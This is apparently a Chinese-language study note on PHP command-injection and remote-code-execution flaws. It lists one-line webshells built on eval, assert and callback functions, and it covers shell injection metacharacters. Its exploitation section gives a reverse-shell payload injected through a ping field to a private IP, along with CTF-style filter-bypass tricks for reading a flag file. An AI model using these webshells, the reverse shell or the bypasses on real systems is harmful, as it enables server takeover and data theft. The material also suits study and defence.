# 命令执行

## 命令执行简介

### 命令执行漏洞产生原因

应用未对**用户输入**做严格的检查过滤，导致用户输入的**参数被当成命令来执行**。

### 命令执行漏洞的危害

- 继承Web服务程序的权限去执行系统命令或读写文件
- 反弹shell，获得目标服务器的权限
- 进一步内网渗透

## 远程代码执行

因为业务需求，在PHP中有时需要调用一些执行命令的函数，如：`eval()、assert()、preg_replace()、create_function()`等。

如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就肯呢个存在远程代码执行漏洞。

### 远程代码执行 - eval函数

```php
eval(string $code)
```

把字符串code作为PHP代码执行

```PHP
<?php @eval($_POST['cmd']);?>
```

#### 注意

- eval()函数传入的参数必须为PHP代码，即要以分号结尾
- 函数eval()语言结构是非常危险的，因为它允许执行任意PHP代码。
- 不要允许传入任何由用户提供的、未经完整验证过的数据。

### 远程代码执行 - assert函数

```php
assert(mixed $assertion [,string $description])
```

检查一个断言是否为FALSE，如果assertion是字符串，它将会被assert()当作PHP代码来执行。

```php
<?php @assert($_POST['cmd'])?>
```

注意：

assert()函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾。

### 远程代码执行 - preg_replace函数

```php
preg_replace(mixed $pattern , mixed $replacement , mixed $subject [,int $limit] = -1 [,int &$count])
```

执行一个正则表达式的搜索和替换，搜索subject中匹配pattern的部分，以replacement进行替换。

```php
<?php preg_replace("/test/e",$_POST[“cmd”],”test”);?>
```

preg_replace(‘正则规则’,’替换字符’,’目标字符’)

| **版本** | **说明**                                                |
| -------- | ------------------------------------------------------- |
| 7.0.0    | 不再支持/e修饰符。请用preg_replace_callback()代替。     |
| 5.5.0    | /e修饰符已经被弃用了。使用preg_replace_callback()代替。 |

PCRE修饰符e : `preg_replace()`在进行了对替换字符串的后巷引用替换之后，讲替换后的字符串作为php代码评估执行(eval函数方式)，并使用执行结果作为实际参与替换的字符串。	

### 远程代码执行 - array_map函数

```php
array_map(callable $callback , array $array1 [, array $......])
```

array_map() : 返回数组，是为array1每个元素应用callback函数之后的数组。

callback函数形参的数量和传给array_map()数组数量，两者必须一样。

为数组的每个元素应用回调函数。

```php
<?php
$func=$_GET['func'];
$cmd=$_POST['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
echo $new_array;
?>
```

### 远程代码执行 - create_function函数

```php
create_function(string $args , string $code)
```

从传递的参数创建一个匿名函数，并为其返回唯一的名称。

通常这些参数将作为单引号分割的字符串传递。使用单引号的原因是为了保护变量名不被解析，否则使用双引号，就需要转义变量名，例如\$avar。

```php
<?php
$func = create_function('',$_POST['cmd']);
$func();
?>
```

### 远程代码执行 - call_user_func函数

```php
call_user_func(callable $callback [, mixed $parameter [, mixed $......]])
```

第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。把第一个参数作为回调函数调用。

```php
<?php
call_user_func("assert",$_POST['cmd']);
//传入的参数作为assert函数的参数
//cmd=system(whoami)
?>
```

### 远程代码执行 - array_filter函数

```php
array_filter(array $array [, callable $callback [, int $flag = 0]])
```

用回调函数过滤数组中的单元依次将array数组中的每个值传递到callback函数。

```php
<?php
$cmd=$_POST['cmd'];
$array1=array($cmd);
$func=$_GET['func'];
array_filter($array1,$func);
//用回调函数过滤数组中的元素：array_filter(数组,函数)
//?func=system
//cmd=whoami
?>
```

### 远程代码执行 - 双引号

```php
<?php
//echo "phpinfo()";
echo "{${phpinfo()}}";
?>
```

在PHP中，双引号里面如果包含有变量，PHP解析器会将其替换为变量解释后的结果。

单引号中的变量不会被处理，双引号中的函数不会被执行和替换。

## 远程系统命令执行

一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的WEB管理界面上，一般会给用户提供一个ping操作的WEB界面，用户从WEB界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。

而如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，让后台进行执行，从而获得后台服务器权限。

利用PHP的系统命令执行函数来调用系统命令并执行，这类函数有`system()、exec()、shell_exec()、passthru()、penti_exec()、popen()、proc_pen()`等，此外还有**反引号命令执行**，这种方式实际上是调用shell_exec()函数来执行。

```php
system()：执行外部程序，并且显示输出
exec()：执行一个外部程序
shell_exec()：通过shell环境执行命令，并且将完整的输出以字符串的方式返回。
passthru()：执行unix系统命令并且显示原始输出
pcntl_exec()：在当前进程空间执行指定程序
popen()：打开进程文件指针
prox_open()：执行一个命令，并且打开用来输入/输出的文件指针
```

### 远程系统命令执行 - exec函数

```php
exec(string $command [, array &$output [, int &$return_var]])
```

执行一个外部程序，exec()执行command参数所指定的命令。

exec执行系统外部命令时不会输出结果，而是返回结果的最后一行。如果想要得到结果，可以使用第二个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。

### 远程系统命令执行 - system函数

```php
system(string $command [, init &$return_var])
```

函数执行command参数所指定的命令，并且输出执行结果。

system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false。                                      

### 远程系统命令执行 - passthru函数

```php
passthru(string $command [, int &$return_var])
```

执行外部程序并且显示原始输出，同exec()函数类似，passthru()函数也是用来执行外部命令(command)的。

当所执行的命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代exec()或system()函数。

passthru和system的区别：passthru直接将结果输出到浏览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。

### 远程系统命令执行 - shell_exec函数

```php
shell_exec(string $cmd)
```

通过shell环境执行命令，并且将完整的输出以字符串的方式返回。

本函数同执行操作符(‘)

```php
<?php
$output=shell_exec(‘ipconfig’);
echo “<pre>$output</pre>”;
?>
```

### 命令执行常用特殊字符

```php
cmd1|cmd2：无论cmd1是否执行成功，cmd2将被执行
cmd1;cmd2：无论cmd1是否执行成功，cmd2将被执行
cmd1||cmd2：仅在cmd1执行失败时才执行cmd2
cmd1&&cmd2：仅在cmd1执行成功后才执行
cmd2$(cmd)：echo $(whoami) 或者 $(touch resr.sh;echo ‘ls’ > test.sh)
'cmd'：用于执行特定命令，如’whoami’
```

## 命令执行漏洞利用

```bash
'$a,$b'

<?php
//要执行的命令
$command="ipconfig";
//存储命令输出
$output=[];
//存储命令的返回状态码
$return_var=0;
exec($command,$output,$return_var);
//输出命令的结果
print_r($output);
//输出返回状态码
echo "Return status:".$return_var;
?>


<?php
$cmd=$_POST['cmd'];
@exec($cmd,$return);
var_dump($return);
?>

<?php
//执行命令"ipconfig"，并直接输出结果
passthru("ipconfig");
?>

<?php
//执行命令"ipconfig"，并将结果存储在变量中
$output=shell_exec("ipconfig");
//输出结果
echo "<pre>$output</pre>";
?>

Linucx
;	前面的执行完执行后面的
|	显示后面的执行结果
||	当前面的执行出错时，执行后面的


Windows
&	前面为假，直接执行后面的
&&	前面为假直接报错，不执行后面的
|	直接执行后面的语句
||	前面出错执行后面的


反弹shell
127.0.0.1|php -r '$sock=fsockopen("192.168.213.132",6666);exec("/bin/sh -i <&3 >&3 2>&3");'

过滤绕过
cat flag

more
less
head
tail
tac
nl
od
vi
vim
sort
uniq
file -f

ca\t fl\ag
cat fl''ag

a=fl;b=ag;cat$IFS$a$b

ca$*t flag
ca$@t flag
ca$1t flag
ca${1}t flag

cat `ls`
cat $(ls)

echo 'cat' | base64
`echo 'Y2F0Cg==' | base64 -d`


cat *a?

curl file:///root/flag1/flag
strings flag

cat${IFS}flag
cat$IFS$1flag
{cat,flag}
```



```bash
[root@localhost flag1]# touch "ag"
[root@localhost flag1]# touch "fl\\"
[root@localhost flag1]# touch "t \\"
[root@localhost flag1]# touch "ca\\"
[root@localhost flag1]# ls -t
ca\  t \  fl\  ag  flag
[root@localhost flag1]# ls -t >shell
[root@localhost flag1]# sh shell
shell:行1: shell: 未找到命令
123456
shell:行6: flag: 未找到命令
```

